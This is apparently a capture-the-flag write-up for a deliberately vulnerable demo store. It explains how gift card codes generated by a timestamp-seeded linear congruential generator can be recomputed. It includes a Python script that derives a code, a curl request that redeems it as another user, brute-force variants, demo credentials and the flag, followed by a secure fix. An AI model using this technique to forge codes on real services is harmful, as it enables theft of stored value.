# Insecure Randomness — Gift Card Code Generation

## Overview

The OopsSec Store sells digital gift cards in four fixed denominations ($25, $50, $100, $500). When a buyer purchases a gift card, the store generates a human-friendly redemption code in the form `XXXX-XXXX-XXXX` and emails it to the recipient. The code is the only thing that protects the value stored on the card — anyone who knows the code can redeem it and receive store credit.

The vulnerability here is that the code is not random. It is derived from the card's creation timestamp using a classic linear congruential generator (LCG) — the same algorithm used by `rand()` in older versions of `glibc` and Numerical Recipes. Because the buyer can see the exact millisecond at which their card was created — and because that timestamp is also exposed in the public `GET /api/gift-cards` response — anyone who can read that timestamp can reproduce the code.

## Why This Is Dangerous

### Predictable "Random" Numbers

A linear congruential generator produces the next state from the previous one with a fixed formula:

```
state = (state * multiplier + increment) mod m
```

Given the seed, every subsequent value is deterministic. The sequence looks random statistically, but it has zero cryptographic strength: anyone who knows (or can guess) the seed can regenerate the entire stream. The Numerical Recipes constants used in this feature (`multiplier = 1103515245`, `increment = 12345`, `m = 2^31`) have been public for decades and are implemented in every language that ships a classic `rand()`.

This class of flaw is covered by:

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](https://cwe.mitre.org/data/definitions/338.html)

It shows up repeatedly in real-world bug bounty reports, typically around:

- Gift-card, voucher, and referral codes
- Password-reset tokens (see the related [Insecure Password Reset](/vulnerabilities/insecure-password-reset) write-up)
- Session identifiers, invite tokens, OTPs
- "Secure" download links

### What This Means

Security controls built on a PRNG are only as strong as the unpredictability of that PRNG's output. Once the seeding space is small enough to enumerate — here, a few seconds of wall-clock time — the attacker no longer needs to steal the code. They can calculate it.

## The Vulnerability

Code generation lives in `lib/gift-card.ts`:

```typescript
function nextState(state: number): number {
  return (Math.imul(state, 1103515245) + 12345) & 0x7fffffff;
}

export function generateGiftCardCode(seed: number): string {
  let state = seed & 0x7fffffff;
  const chars: string[] = [];
  for (let i = 0; i < 12; i++) {
    state = nextState(state);
    const index = (state >>> 16) % ALPHABET.length;
    chars.push(ALPHABET[index]);
  }
  // formatted as XXXX-XXXX-XXXX
  ...
}
```

Two things make this exploitable:

1. **The seed is a timestamp.** `POST /api/gift-cards` calls `generateGiftCardCode(createdAt.getTime())`. The attacker only needs to know the creation instant of a target card to regenerate its code.
2. **The timestamp is exposed.** `GET /api/gift-cards` returns the `createdAt` field with full millisecond precision. The `/profile/gift-cards` page also renders it. Even the seeded $500 card owned by Alice lists its timestamp for anyone authenticated as Alice — and as we will see, any authenticated user can redeem the code once they derive it.

There is also a deliberate side-channel closure: `POST /api/gift-cards/resend` always responds with HTTP 503 "Email service temporarily unavailable", so the buyer cannot use it to re-extract the code. The attack must go through code _generation_, not code _delivery_.

## Root Cause

`lib/gift-card.ts` uses a non-cryptographic PRNG seeded with a predictable value. The correct primitive for anything that functions as a secret is `crypto.randomBytes()` (Node.js) or `crypto.getRandomValues()` (Web Crypto) — both of which draw from the OS entropy pool and have no recoverable internal state.

The weakness is amplified by exposing `createdAt` to end users. Even with a stronger PRNG, leaking the seed would defeat it; and even without leaking the seed, a weak PRNG can often be recovered from a small number of consecutive outputs.

## Exploitation

### How to Retrieve the Flag

The flag `OSS{1ns3cur3_r4nd0mn3ss_g1ft_c4rd}` is returned in the `POST /api/gift-cards/redeem` response when the seeded $500 gift card (id `gc-seeded-001`, recipient `forgotten-friend@oopssec.store`) is redeemed.

1. Log in as any buyer who can view the seeded card — the demo ships with Alice (`alice@example.com` / `iloveduck`) as the buyer. Visit `/profile/gift-cards`.
2. Note the "Sent on" timestamp for the `forgotten-friend@oopssec.store` card — it is rendered down to the millisecond. The same value is available from `GET /api/gift-cards` as `createdAt`.
3. Reproduce the LCG locally, seeded with that timestamp in milliseconds since the Unix epoch:

```python
ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789"
MULTIPLIER = 1103515245
INCREMENT = 12345
MASK = 0x7fffffff

def gift_card_code(seed_ms: int) -> str:
    state = seed_ms & MASK
    chars = []
    for _ in range(12):
        state = (state * MULTIPLIER + INCREMENT) & MASK
        chars.append(ALPHABET[(state >> 16) % len(ALPHABET)])
    return f"{''.join(chars[0:4])}-{''.join(chars[4:8])}-{''.join(chars[8:12])}"

# From the UI / API: 2025-01-15T10:42:33.456Z
import datetime
seed = int(datetime.datetime(2025, 1, 15, 10, 42, 33, 456000,
                             tzinfo=datetime.timezone.utc).timestamp() * 1000)
print(gift_card_code(seed))  # → JQSP-2G6N-G2ZY
```

4. Log in as a _different_ user (e.g. Bob — `bob@example.com` / `qwerty`) to show that anyone can redeem the code, not just the intended recipient. Visit `/checkout/redeem`, paste the derived code, and submit:

```bash
curl -X POST http://localhost:3000/api/gift-cards/redeem \
  -H "Content-Type: application/json" \
  -H "Cookie: authToken=<bob-session-token>" \
  -d '{"code":"JQSP-2G6N-G2ZY"}'
```

5. The response credits $500 to Bob's account balance and includes the flag:

```json
{
  "success": true,
  "amount": 500,
  "balance": 500,
  "flag": "OSS{1ns3cur3_r4nd0mn3ss_g1ft_c4rd}"
}
```

### Variants

- **Unknown exact timestamp.** If you only know that a card was issued in a given hour, you can brute-force the full millisecond space (3.6 million candidates) and request `/api/gift-cards/redeem` for each — or, better, generate all codes locally and filter by the format the target accepts.
- **Bulk harvesting.** If a list of timestamps is leaked elsewhere (analytics logs, CDN timestamps, email `Date` headers), every such leak expands the attacker's candidate set.

## Secure Implementation

### Do Not Seed Secrets With Timestamps

Replace `generateGiftCardCode` with a draw from a cryptographically secure random source:

```typescript
import { randomBytes } from "node:crypto";

const ALPHABET = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";

export function generateGiftCardCode(): string {
  const bytes = randomBytes(12);
  const chars: string[] = [];
  for (let i = 0; i < 12; i++) {
    chars.push(ALPHABET[bytes[i] % ALPHABET.length]);
  }
  return `${chars.slice(0, 4).join("")}-${chars
    .slice(4, 8)
    .join("")}-${chars.slice(8, 12).join("")}`;
}
```

A 12-character code from a 32-character alphabet carries ~60 bits of entropy — enough that enumeration is infeasible and a collision check at insert time handles the birthday-style edge case.

### Do Not Expose Creation Timestamps With Millisecond Precision

Even with a strong PRNG, leaking internal state is bad hygiene. Return `createdAt` rounded to the day, or simply omit it from the public API surface. The buyer does not need millisecond resolution to know when they sent a card.

### Store Codes Hashed, Not Plaintext

Treat the code like a password. Hash it (e.g. SHA-256 is fine for high-entropy secrets; use `bcrypt` / `argon2` if entropy is lower) when the card is created, store only the hash, and compare hashes on redemption. A database dump then leaks nothing that the attacker can spend.

### Use Constant-Time Comparison and Atomic Redemption

When comparing a submitted code to stored codes, use a constant-time comparison (`crypto.timingSafeEqual`) to avoid timing side channels — this codebase already does so in the redeem handler, but reimplementations often regress. Redemption itself should be atomic (`UPDATE ... WHERE status = 'PENDING'`) to prevent double-spend races.

## References

- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
- [CWE-338: Use of Cryptographically Weak Pseudo-Random Number Generator (PRNG)](https://cwe.mitre.org/data/definitions/338.html)
- [OWASP — Insecure Randomness](https://owasp.org/www-community/vulnerabilities/Insecure_Randomness)
- [Node.js `crypto.randomBytes` docs](https://nodejs.org/api/crypto.html#cryptorandombytessize-callback)
- [Numerical Recipes — LCG parameters](https://en.wikipedia.org/wiki/Linear_congruential_generator)
